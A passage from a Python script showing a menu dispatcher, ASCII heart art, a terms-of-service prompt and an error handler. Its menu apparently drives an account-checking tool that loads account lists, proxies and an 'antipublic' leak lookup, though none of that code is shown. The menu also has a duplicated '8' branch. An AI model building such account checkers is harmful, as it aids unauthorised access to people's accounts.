            settings()
        elif alegere_menu == "8":
            keyword_gen()
        elif alegere_menu == "8":
            spammer_check()
        elif alegere_menu == "9":
            load_accounts()
            load_proxies()
            antipublic()
        elif alegere_menu == "10":
            sys.exit()
        else:
            print(" Invalid input.. ")
            time.sleep(2)
            menu()

    love_logo = """
    _____$$$$_________$$$$
    ___$$$$$$$$_____$$$$$$$$
    _$$$$$$$$$$$$_$$$$$$$$$$$$
    $$$$$$$$$$$$$$$$$$$$$$$$$$$
    $$$$$$$$$$$$$$$$$$$$$$$$$$$
    _$$$$$$$$$$$$$$$$$$$$$$$$$
    __$$$$$$$$$$$$$$$$$$$$$$$
    ____$$$$$$$$$$$$$$$$$$$
    _______$$$$$$$$$$$$$
    __________$$$$$$$
    ____________$$$
    _____________$
    """

    os.system('cls')
    tos()
    ask = messagebox.askyesno("TOS", "Do you agree our TOS?")
    if ask is True:
       logincheck()
    else:
        print("Then we have to end this here :(\n\nWe are closing..")
        time.sleep(2)
        sys.exit()
    
except Exception as exception:
    import sys, os, time
    print("ERROR FOUND\n\nERROR: {}".format(exception))
    time.sleep(5)
    input("\nPress any key to quit.")
    sys.exit()
